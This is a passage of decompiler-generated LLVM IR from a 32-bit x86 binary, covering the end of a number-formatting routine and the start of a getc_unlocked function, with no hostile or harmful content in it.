  %v1_8061fb9 = add i32 %v0_8061fb9, 8
  %v2_8061fb9 = inttoptr i32 %v1_8061fb9 to i32*
  store i32 ptrtoint (i32* @global_var_806e500.849 to i32), i32* %v2_8061fb9, align 4
  %v0_8061fc0 = load i32, i32* @ecx, align 4
  %v1_8061fc0 = add i32 %v0_8061fc0, 12
  store i32 %v1_8061fc0, i32* @ecx, align 4
  %v0_8061fc3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061fc3

dec_label_pc_8061fc3:                             ; preds = %dec_label_pc_8061fa8, %dec_label_pc_8061fa1, %dec_label_pc_8061fac
  %v0_8061fc8 = phi i32 [ %v0_8061fac, %dec_label_pc_8061fa8 ], [ %v0_8061fac, %dec_label_pc_8061fa1 ], [ %v1_8061fc0, %dec_label_pc_8061fac ]
  %v0_8061fc3 = phi i32 [ %v0_8061fc372, %dec_label_pc_8061fa8 ], [ %v0_8061fc372, %dec_label_pc_8061fa1 ], [ %v0_8061fc3.pre, %dec_label_pc_8061fac ]
  %v1_8061fc3 = add i32 %v0_8061fc3, 1
  %v8_8061fc3 = icmp eq i32 %v1_8061fc3, 0
  store i32 %v1_8061fc3, i32* %ebx.global-to-local, align 4
  br i1 %v8_8061fc3, label %dec_label_pc_8061fdd, label %dec_label_pc_8061fc6

dec_label_pc_8061fc6:                             ; preds = %dec_label_pc_8061fc3
  store i32 %v1_8061fc3, i32* %eax.global-to-local, align 4
  %v1_8061fc8 = inttoptr i32 %v0_8061fc8 to i32*
  store i32 176, i32* %v1_8061fc8, align 4
  %v0_8061fce = load i32, i32* %eax.global-to-local, align 4
  %v1_8061fce = sub i32 0, %v0_8061fce
  store i32 %v1_8061fce, i32* %eax.global-to-local, align 4
  %v1_8061fd0 = load i32, i32* @ecx, align 4
  %v2_8061fd0 = add i32 %v1_8061fd0, 4
  %v3_8061fd0 = inttoptr i32 %v2_8061fd0 to i32*
  store i32 %v1_8061fce, i32* %v3_8061fd0, align 4
  %v0_8061fd3 = load i32, i32* @ecx, align 4
  %v1_8061fd3 = add i32 %v0_8061fd3, 8
  %v2_8061fd3 = inttoptr i32 %v1_8061fd3 to i32*
  store i32 ptrtoint (i32* @global_var_806e4f3.848 to i32), i32* %v2_8061fd3, align 4
  %v0_8061fda = load i32, i32* @ecx, align 4
  %v1_8061fda = add i32 %v0_8061fda, 12
  store i32 %v1_8061fda, i32* @ecx, align 4
  br label %dec_label_pc_8061fdd

dec_label_pc_8061fdd:                             ; preds = %dec_label_pc_8061fc3, %dec_label_pc_8061fc6
  %v0_8061fe1 = phi i32 [ %v0_8061fc8, %dec_label_pc_8061fc3 ], [ %v1_8061fda, %dec_label_pc_8061fc6 ]
  %v0_8061fdd = load i32, i32* %edx.global-to-local, align 4
  %v1_8061fdd = icmp eq i32 %v0_8061fdd, 0
  br i1 %v1_8061fdd, label %dec_label_pc_8061ff0, label %dec_label_pc_8061fe1

dec_label_pc_8061fe1:                             ; preds = %dec_label_pc_8061fdd
  %v1_8061fe1 = inttoptr i32 %v0_8061fe1 to i32*
  store i32 112, i32* %v1_8061fe1, align 4
  %v0_8061fe7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061fe7 = load i32, i32* @ecx, align 4
  %v2_8061fe7 = add i32 %v1_8061fe7, 4
  %v3_8061fe7 = inttoptr i32 %v2_8061fe7 to i32*
  store i32 %v0_8061fe7, i32* %v3_8061fe7, align 4
  %v0_8061fea = load i32, i32* %edi.global-to-local, align 4
  %v1_8061fea = load i32, i32* @ecx, align 4
  %v2_8061fea = add i32 %v1_8061fea, 8
  %v3_8061fea = inttoptr i32 %v2_8061fea to i32*
  store i32 %v0_8061fea, i32* %v3_8061fea, align 4
  %v0_8061fed = load i32, i32* @ecx, align 4
  %v1_8061fed = add i32 %v0_8061fed, 12
  store i32 %v1_8061fed, i32* @ecx, align 4
  br label %dec_label_pc_8061ff0

dec_label_pc_8061ff0:                             ; preds = %dec_label_pc_8061fdd, %dec_label_pc_8061fe1
  %v0_806200e = phi i32 [ %v0_8061fe1, %dec_label_pc_8061fdd ], [ %v1_8061fed, %dec_label_pc_8061fe1 ]
  br i1 %v1_8061e0a, label %dec_label_pc_8062004, label %dec_label_pc_8061ff7

dec_label_pc_8061ff7:                             ; preds = %dec_label_pc_8061ff0
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_8061ffe = load i8, i8* %v2_8061f97, align 1
  %v4_8061ffe = and i8 %v3_8061ffe, 16
  %v5_8061ffe = icmp eq i8 %v4_8061ffe, 0
  br i1 %v5_8061ffe, label %dec_label_pc_8062021, label %dec_label_pc_8062004

dec_label_pc_8062004:                             ; preds = %dec_label_pc_8061ff7, %dec_label_pc_8061ff0
  %v0_8062004 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062006 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062006 = sub i32 %v0_8062004, %v1_8062006
  store i32 %v2_8062006, i32* %eax.global-to-local, align 4
  %v1_8062008 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8062008 = sub i32 %v2_8062006, %v1_8062008
  %v8_8062008 = xor i32 %v1_8062008, %v2_8062006
  %v9_8062008 = xor i32 %v2_8062008, %v2_8062006
  %v10_8062008 = and i32 %v9_8062008, %v8_8062008
  %v11_8062008 = icmp slt i32 %v10_8062008, 0
  %v13_8062008 = icmp slt i32 %v2_8062008, 0
  %v2_806200a = icmp eq i1 %v13_8062008, %v11_8062008
  br i1 %v2_806200a, label %dec_label_pc_8062021, label %dec_label_pc_806200c

dec_label_pc_806200c:                             ; preds = %dec_label_pc_8062004
  %v2_806200c = sub i32 %v1_8062008, %v2_8062006
  store i32 %v2_806200c, i32* %ebp.global-to-local, align 4
  %v1_806200e = inttoptr i32 %v0_806200e to i32*
  store i32 176, i32* %v1_806200e, align 4
  %v0_8062014 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8062014 = load i32, i32* @ecx, align 4
  %v2_8062014 = add i32 %v1_8062014, 4
  %v3_8062014 = inttoptr i32 %v2_8062014 to i32*
  store i32 %v0_8062014, i32* %v3_8062014, align 4
  %v0_8062017 = load i32, i32* @ecx, align 4
  %v1_8062017 = add i32 %v0_8062017, 8
  %v2_8062017 = inttoptr i32 %v1_8062017 to i32*
  store i32 ptrtoint (i32* @global_var_806e4f3.848 to i32), i32* %v2_8062017, align 4
  %v0_806201e = load i32, i32* @ecx, align 4
  %v1_806201e = add i32 %v0_806201e, 12
  store i32 %v1_806201e, i32* @ecx, align 4
  br label %dec_label_pc_8062021

dec_label_pc_8062021:                             ; preds = %dec_label_pc_8062004, %dec_label_pc_8061ff7, %dec_label_pc_806200c
  %v1_80620a484 = phi i32 [ %v0_806200e, %dec_label_pc_8062004 ], [ %v0_806200e, %dec_label_pc_8061ff7 ], [ %v1_806201e, %dec_label_pc_806200c ]
  %v12_8062021 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8062021, label %dec_label_pc_8062097, label %dec_label_pc_8062028

dec_label_pc_8062028:                             ; preds = %dec_label_pc_8062021
  %v0_806202f = load i32, i32* %esi.global-to-local, align 4
  %v2_806202f = icmp slt i32 %v0_806202f, 0
  %v1_8062031 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_806202f, i32* %edx.global-to-local, align 4
  br i1 %v2_806202f, label %dec_label_pc_8062040, label %dec_label_pc_8062037

dec_label_pc_8062037:                             ; preds = %dec_label_pc_8062028
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062049

dec_label_pc_8062040:                             ; preds = %dec_label_pc_8062028
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_8062047 = sub i32 0, %v0_806202f
  store i32 %v1_8062047, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8062049

dec_label_pc_8062049:                             ; preds = %dec_label_pc_8062037, %dec_label_pc_8062040
  %v0_806205d77 = phi i32 [ %v0_806202f, %dec_label_pc_8062037 ], [ %v1_8062047, %dec_label_pc_8062040 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8062051 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8062051, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806205d

dec_label_pc_806205d:                             ; preds = %dec_label_pc_806205d.backedge, %dec_label_pc_8062049
  %v0_806206b = phi i32 [ %v0_806206e, %dec_label_pc_806205d.backedge ], [ 2, %dec_label_pc_8062049 ]
  %v0_8062067 = phi i32 [ %v0_8062067.pre, %dec_label_pc_806205d.backedge ], [ %v2_8062051, %dec_label_pc_8062049 ]
  %v0_806205d = phi i32 [ %v9_8062065, %dec_label_pc_806205d.backedge ], [ %v0_806205d77, %dec_label_pc_8062049 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8062064 = ashr i32 %v0_806205d, 31
  %v2_8062065 = zext i32 %v0_806205d to i64
  %v4_8062065 = zext i32 %v1_8062064 to i64
  %v5_8062065 = mul nuw i64 %v4_8062065, 4294967296
  %v6_8062065 = or i64 %v5_8062065, %v2_8062065
  %v8_8062065 = sdiv i64 %v6_8062065, 10
  %v9_8062065 = trunc i64 %v8_8062065 to i32
  store i32 %v9_8062065, i32* %eax.global-to-local, align 4
  %v11_8062065 = srem i64 %v6_8062065, 10
  %v12_8062065 = trunc i64 %v11_8062065 to i8
  %v1_8062067 = add i32 %v0_8062067, -1
  store i32 %v1_8062067, i32* %ebx.global-to-local, align 4
  %v1_8062068 = add i8 %v12_8062065, 48
  %v1_806206b = add i32 %v0_806206b, 1
  store i32 %v1_806206b, i32* %esi.global-to-local, align 4
  %v3_806206c = inttoptr i32 %v1_8062067 to i8*
  store i8 %v1_8062068, i8* %v3_806206c, align 1
  %v0_806206e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8062065, i32* %edx.global-to-local, align 4
  %v7_8062073 = icmp sgt i32 %v0_806206e, 3
  br i1 %v7_8062073, label %dec_label_pc_8062075, label %dec_label_pc_806205d.backedge

dec_label_pc_8062075:                             ; preds = %dec_label_pc_806205d
  %v2_8062075 = icmp eq i32 %v9_8062065, 0
  %v1_8062077 = icmp eq i1 %v2_8062075, false
  br i1 %v1_8062077, label %dec_label_pc_806205d.backedge, label %dec_label_pc_8062079

dec_label_pc_806205d.backedge:                    ; preds = %dec_label_pc_8062075, %dec_label_pc_806205d
  %v0_8062067.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806205d

dec_label_pc_8062079:                             ; preds = %dec_label_pc_8062075
  %v0_8062079 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8062079, i32* %edx.global-to-local, align 4
  %v0_806207b = load i32, i32* %ebx.global-to-local, align 4
  %v1_806207b = add i32 %v0_806207b, -2
  store i32 %v1_806207b, i32* %eax.global-to-local, align 4
  %v1_806207e = trunc i32 %v0_8062079 to i8
  %v3_806207e = add i32 %v0_806207b, -1
  %v4_806207e = inttoptr i32 %v3_806207e to i8*
  store i8 %v1_806207e, i8* %v4_806207e, align 1
  %v5_8062081 = load i32, i32* %edx.global-to-local, align 4
  %v6_8062081 = and i32 %v5_8062081, -256
  %v7_8062081 = or i32 %v6_8062081, %stack_var_-42.0
  store i32 %v7_8062081, i32* %edx.global-to-local, align 4
  %v2_8062085 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8062085 = add i32 %v2_8062085, -2
  %v4_8062085 = inttoptr i32 %v3_8062085 to i8*
  store i8 %v1_8062031, i8* %v4_8062085, align 1
  %v0_8062088 = load i32, i32* @ecx, align 4
  %v1_8062088 = inttoptr i32 %v0_8062088 to i32*
  store i32 112, i32* %v1_8062088, align 4
  %v0_806208e = load i32, i32* %esi.global-to-local, align 4
  %v1_806208e = load i32, i32* @ecx, align 4
  %v2_806208e = add i32 %v1_806208e, 4
  %v3_806208e = inttoptr i32 %v2_806208e to i32*
  store i32 %v0_806208e, i32* %v3_806208e, align 4
  %v0_8062091 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062091 = load i32, i32* @ecx, align 4
  %v2_8062091 = add i32 %v1_8062091, 8
  %v3_8062091 = inttoptr i32 %v2_8062091 to i32*
  store i32 %v0_8062091, i32* %v3_8062091, align 4
  %v0_8062094 = load i32, i32* @ecx, align 4
  %v1_8062094 = add i32 %v0_8062094, 12
  store i32 %v1_8062094, i32* @ecx, align 4
  br label %dec_label_pc_8062097

dec_label_pc_8062097:                             ; preds = %dec_label_pc_8062021, %dec_label_pc_8061cbc, %dec_label_pc_8062079
  %v0_8062118 = phi i32 [ %v1_80620a484, %dec_label_pc_8062021 ], [ %v2_8061cc4, %dec_label_pc_8061cbc ], [ %v1_8062094, %dec_label_pc_8062079 ]
  %v2_8062097 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8062097, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806209b

dec_label_pc_806209b:                             ; preds = %dec_label_pc_806209b, %dec_label_pc_8062097
  %v0_806209b = phi i32 [ %v2_8062097, %dec_label_pc_8062097 ], [ %v1_806209d, %dec_label_pc_806209b ]
  %stack_var_-216.0 = phi i32 [ %v3_8061baf, %dec_label_pc_8062097 ], [ %v5_80620a0, %dec_label_pc_806209b ]
  %v1_806209b = inttoptr i32 %v0_806209b to i32*
  %v2_806209b = load i32, i32* %v1_806209b, align 4
  store i32 %v2_806209b, i32* %edx.global-to-local, align 4
  %v1_806209d = add i32 %v0_806209b, 12
  store i32 %v1_806209d, i32* %eax.global-to-local, align 4
  %v5_80620a0 = sub i32 %stack_var_-216.0, %v2_806209b
  %v7_80620a4 = icmp ult i32 %v1_806209d, %v0_8062118
  br i1 %v7_80620a4, label %dec_label_pc_806209b, label %dec_label_pc_80620a8

dec_label_pc_80620a8:                             ; preds = %dec_label_pc_806209b
  %v5_80620b1 = icmp eq i8 %stack_var_-26.0, 0
  %v1_80620c1 = icmp eq i1 %v5_80620b1, false
  %v2_80620c1 = zext i1 %v1_80620c1 to i32
  %v2_80620c4 = sub i32 %v5_80620a0, %v2_80620c1
  store i32 %v2_80620c4, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_80620c4, i32* %eax.global-to-local, align 4
  store i32 %v0_8062118, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_80620c4, 1
  br i1 %tmp141, label %dec_label_pc_806211a, label %dec_label_pc_80620da

dec_label_pc_80620da:                             ; preds = %dec_label_pc_80620a8
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_80620e1 = inttoptr i32 %v1_8061bef to i8*
  %v3_80620e1 = load i8, i8* %v2_80620e1, align 1
  %v4_80620e1 = and i8 %v3_80620e1, 8
  %v5_80620e1 = icmp eq i8 %v4_80620e1, 0
  br i1 %v5_80620e1, label %dec_label_pc_80620fc, label %dec_label_pc_80620e7

dec_label_pc_80620e7:                             ; preds = %dec_label_pc_80620da
  %v1_80620e7 = add i32 %v0_8062118, 12
  store i32 %v1_80620e7, i32* %esi.global-to-local, align 4
  %v1_80620ea = inttoptr i32 %v0_8062118 to i32*
  store i32 160, i32* %v1_80620ea, align 4
  %v0_80620f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80620f0 = load i32, i32* @ecx, align 4
  %v2_80620f0 = add i32 %v1_80620f0, 4
  %v3_80620f0 = inttoptr i32 %v2_80620f0 to i32*
  store i32 %v0_80620f0, i32* %v3_80620f0, align 4
  %v0_80620f3 = load i32, i32* @ecx, align 4
  %v1_80620f3 = add i32 %v0_80620f3, 8
  %v2_80620f3 = inttoptr i32 %v1_80620f3 to i32*
  store i32 ptrtoint (i32* @global_var_806e4f3.848 to i32), i32* %v2_80620f3, align 4
  br label %dec_label_pc_806211a

dec_label_pc_80620fc:                             ; preds = %dec_label_pc_80620da
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8062103 = add i32 %tmp112, 16
  %v2_8062103 = inttoptr i32 %v1_8062103 to i32*
  %v3_8062103 = load i32, i32* %v2_8062103, align 4
  %v9_8062103 = icmp eq i32 %v3_8062103, 48
  %v1_8062107 = icmp eq i1 %v9_8062103, false
  br i1 %v1_8062107, label %dec_label_pc_8062114, label %dec_label_pc_8062109

dec_label_pc_8062109:                             ; preds = %dec_label_pc_80620fc
  %v3_8062109 = load i32, i32* %stack_var_-152, align 4
  %v5_8062109 = add i32 %v3_8062109, %v2_80620c4
  store i32 %v5_8062109, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8062118

dec_label_pc_806210f:                             ; preds = %dec_label_pc_8062120
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062147

dec_label_pc_8062114:                             ; preds = %dec_label_pc_80620fc
  br label %dec_label_pc_8062118

dec_label_pc_8062118:                             ; preds = %dec_label_pc_8062109, %dec_label_pc_8062114
  store i32 %v0_8062118, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806211a

dec_label_pc_806211a:                             ; preds = %dec_label_pc_80620a8, %dec_label_pc_80620e7, %dec_label_pc_8062118
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_806211c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_806211c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062120

dec_label_pc_8062120:                             ; preds = %dec_label_pc_806213e, %dec_label_pc_806211a
  call void @__pseudo_call(i32 %tmp112)
  %v0_8062139 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062139 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062139 = add i32 %v1_8062139, 4
  %v3_8062139 = inttoptr i32 %v2_8062139 to i32*
  %v4_8062139 = load i32, i32* %v3_8062139, align 4
  %v15_8062139 = icmp eq i32 %v0_8062139, %v4_8062139
  %v1_806213c = icmp eq i1 %v15_8062139, false
  br i1 %v1_806213c, label %dec_label_pc_806210f, label %dec_label_pc_806213e

dec_label_pc_806213e:                             ; preds = %dec_label_pc_8062120
  %v1_806213e = add i32 %v1_8062139, 12
  store i32 %v1_806213e, i32* %ebx.global-to-local, align 4
  %v0_8062141 = load i32, i32* %edi.global-to-local, align 4
  %v2_8062141 = add i32 %v0_8062141, %v0_8062139
  store i32 %v2_8062141, i32* %edi.global-to-local, align 4
  %v1_8062143 = load i32, i32* %esi.global-to-local, align 4
  %v7_8062143 = icmp ult i32 %v1_806213e, %v1_8062143
  br i1 %v7_8062143, label %dec_label_pc_8062120, label %dec_label_pc_8062147

dec_label_pc_8062147:                             ; preds = %dec_label_pc_806213e, %dec_label_pc_806210f
  %v0_806214d = phi i32 [ -1, %dec_label_pc_806210f ], [ %v2_8062141, %dec_label_pc_806213e ]
  store i32 %v0_806214d, i32* %eax.global-to-local, align 4
  %v2_8062150 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8062150, i32* @esi, align 4
  store i32 %v0_8061b92, i32* @edi, align 4
  store i32 %v0_8061b91, i32* @ebp, align 4
  ret i32 %v0_806214d

; uselistorder directives
  uselistorder i32 %v0_806214d, { 1, 0 }
  uselistorder i32 %v0_8062139, { 1, 0 }
  uselistorder i32 %v1_806209d, { 1, 2, 0 }
  uselistorder i32 %v0_806209b, { 1, 0 }
  uselistorder i32 %v0_8062118, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_806206e, { 1, 0 }
  uselistorder i32 %v9_8062065, { 1, 2, 3, 0 }
  uselistorder i32 %v0_806205d, { 1, 0 }
  uselistorder i32 %v0_806202f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8062008, { 1, 0 }
  uselistorder i32 %v1_8062008, { 1, 0, 2 }
  uselistorder i32 %v2_8062006, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8061f3c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8061f22, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8061f87, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_8061eed, { 0, 2, 1 }
  uselistorder i32 %v1_8061ec6, { 1, 0 }
  uselistorder i32 %v0_8061ec1, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8061e8e, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8061e89, { 1, 0 }
  uselistorder i8 %v2_8061e82, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8061e82, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8061e0c, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_8061df1, { 1, 0 }
  uselistorder i32 %v1_8061ddd, { 1, 0 }
  uselistorder i32 %v0_8061dd1, { 1, 0 }
  uselistorder i32 %v4_8061db8, { 1, 0 }
  uselistorder i32 %tmp148, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8061dbd, { 1, 0 }
  uselistorder i32 %v2_8061d7b, { 1, 0, 2 }
  uselistorder i3 %v1_8061c31, { 1, 0 }
  uselistorder i8 %v4_8061cb0, { 1, 0 }
  uselistorder i32 %v3_8061bef, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_8061bef, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_8061bc1, { 1, 0 }
  uselistorder i32 %v3_8061baf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 3, 1, 2, 0 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 8, 9, 11, 12, 13, 14, 15, 2, 3, 1, 0, 4, 5, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 15, 16, 17, 18, 19, 22, 23, 20, 21, 24, 27, 26, 28, 25, 29, 0, 3, 1, 4, 2, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %edi.global-to-local, { 1, 3, 4, 2, 6, 5, 7, 8, 9, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 0, 2, 3, 1, 7, 4, 5, 6, 8, 9, 10, 11 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 11, 5, 6, 0, 3, 7, 1, 4, 2, 8 }
  uselistorder i32* %eax.global-to-local, { 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 2, 3, 18, 19, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 48, { 12, 14, 2, 3, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i8 -53, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 0, 2, 1 }
  uselistorder i16 256, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_806211a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8062118, { 1, 0 }
  uselistorder label %dec_label_pc_8062097, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062049, { 1, 0 }
  uselistorder label %dec_label_pc_8062021, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8061fdd, { 1, 0 }
  uselistorder label %dec_label_pc_8061fc3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061f90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061f7b, { 1, 0 }
  uselistorder label %dec_label_pc_8061f70, { 1, 0 }
  uselistorder label %dec_label_pc_8061ef7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061ee9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8061eaf, { 1, 0 }
  uselistorder label %dec_label_pc_8061e7f.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8061e4b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061e1a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8061e05, { 1, 0 }
  uselistorder label %dec_label_pc_8061cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8061be0, { 1, 0 }
  uselistorder label %dec_label_pc_8061bd7, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_1()
  %stack_var_-5 = alloca i8, align 1
  %v0_8062154 = load i32, i32* @ebx, align 4
  %v4_8062158 = ptrtoint i16* %tmp to i32
  store i32 %v4_8062158, i32* @ebx, align 4
  %v1_806215c = add i32 %v4_8062158, 16
  %v2_806215c = inttoptr i32 %v1_806215c to i32*
  %v3_806215c = load i32, i32* %v2_806215c, align 4
  %v2_806215f = add i32 %v4_8062158, 24
  %v3_806215f = inttoptr i32 %v2_806215f to i32*
  %v4_806215f = load i32, i32* %v3_806215f, align 4
  %v10_806215f = icmp ult i32 %v3_806215c, %v4_806215f
  br i1 %v10_806215f, label %dec_label_pc_8062201, label %dec_label_pc_8062168

dec_label_pc_8062168:                             ; preds = %entry
  %v2_8062168 = load i16, i16* %tmp, align 2
  %v3_8062168 = zext i16 %v2_8062168 to i32
  %v1_806216b = and i32 %v3_8062168, 131
  %v6_8062175 = icmp ugt i32 %v1_806216b, 128
  br i1 %v6_8062175, label %dec_label_pc_806218f, label %dec_label_pc_8062177

dec_label_pc_8062177:                             ; preds = %dec_label_pc_8062168
  %v0_8062177 = load i32, i32* @edx, align 4
  %v5_806217f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8062177)
  %v1_8062187 = icmp eq i32 %v5_806217f, 0
  %v1_8062189 = icmp eq i1 %v1_8062187, false
  br i1 %v1_8062189, label %dec_label_pc_8062226, label %dec_label_pc_8062177.dec_label_pc_806218f_crit_edge

dec_label_pc_8062177.dec_label_pc_806218f_crit_edge: ; preds = %dec_label_pc_8062177
  %v0_806218f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806218f

dec_label_pc_806218f:                             ; preds = %dec_label_pc_8062177.dec_label_pc_806218f_crit_edge, %dec_label_pc_8062168
  %v2_80621c3 = phi i32 [ %v0_806218f.pre, %dec_label_pc_8062177.dec_label_pc_806218f_crit_edge ], [ %v4_8062158, %dec_label_pc_8062168 ]
  %v1_806218f = inttoptr i32 %v2_80621c3 to i32*
  %v2_806218f = load i32, i32* %v1_806218f, align 4
  store i32 %v2_806218f, i32* @ecx, align 4
  %v1_8062191 = urem i32 %v2_806218f, 65536
  store i32 %v1_8062191, i32* %edx.global-to-local, align 4
  %v2_8062194 = and i32 %v2_806218f, 2
  %v3_8062194 = icmp eq i32 %v2_8062194, 0
  br i1 %v3_8062194, label %dec_label_pc_80621b2, label %dec_label_pc_8062199

dec_label_pc_8062199:                             ; preds = %dec_label_pc_806218f
  %v1_8062199 = urem i32 %v2_806218f, 2
  store i32 %v1_8062199, i32* %edx.global-to-local, align 4
  %v1_806219c = add i32 %v2_806218f, 65535
  %v1_806219f = trunc i32 %v1_806219c to i16
  %v3_806219f = inttoptr i32 %v2_80621c3 to i16*
  store i16 %v1_806219f, i16* %v3_806219f, align 2
  %v0_80621a2 = load i32, i32* @ebx, align 4
  %v1_80621a2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80621a2 = mul i32 %v1_80621a2, 4
  %v3_80621a2 = add i32 %v0_80621a2, 36
  %v4_80621a2 = add i32 %v3_80621a2, %v2_80621a2
  %v5_80621a2 = inttoptr i32 %v4_80621a2 to i8*
  %v6_80621a2 = load i8, i8* %v5_80621a2, align 1
  %v7_80621a2 = zext i8 %v6_80621a2 to i32
  %v9_80621a2 = and i32 %v1_80621a2, -256
  %v10_80621a2 = or i32 %v7_80621a2, %v9_80621a2
  store i32 %v10_80621a2, i32* %edx.global-to-local, align 4
  %v1_80621a6 = add i32 %v0_80621a2, 40
  %v2_80621a6 = inttoptr i32 %v1_80621a6 to i32*
  store i32 0, i32* %v2_80621a6, align 4
  %v0_80621ad = load i32, i32* %edx.global-to-local, align 4
  %v1_80621ad = urem i32 %v0_80621ad, 256
  store i32 %v1_80621ad, i32* @edx, align 4
  br label %dec_label_pc_8062229

dec_label_pc_80621b2:                             ; preds = %dec_label_pc_806218f
  %v1_80621b2 = add i32 %v2_80621c3, 16
  %v2_80621b2 = inttoptr i32 %v1_80621b2 to i32*
  %v3_80621b2 = load i32, i32* %v2_80621b2, align 4
  %v1_80621b5 = add i32 %v2_80621c3, 20
  %v2_80621b5 = inttoptr i32 %v1_80621b5 to i32*
  %v3_80621b5 = load i32, i32* %v2_80621b5, align 4
  %v15_80621b5 = icmp eq i32 %v3_80621b5, %v3_80621b2
  %v1_80621b8 = icmp eq i1 %v15_80621b5, false
  br i1 %v1_80621b8, label %dec_label_pc_8062201, label %dec_label_pc_80621ba

dec_label_pc_80621ba:                             ; preds = %dec_label_pc_80621b2
  %v1_80621ba = add i32 %v2_80621c3, 4
  %v2_80621ba = inttoptr i32 %v1_80621ba to i32*
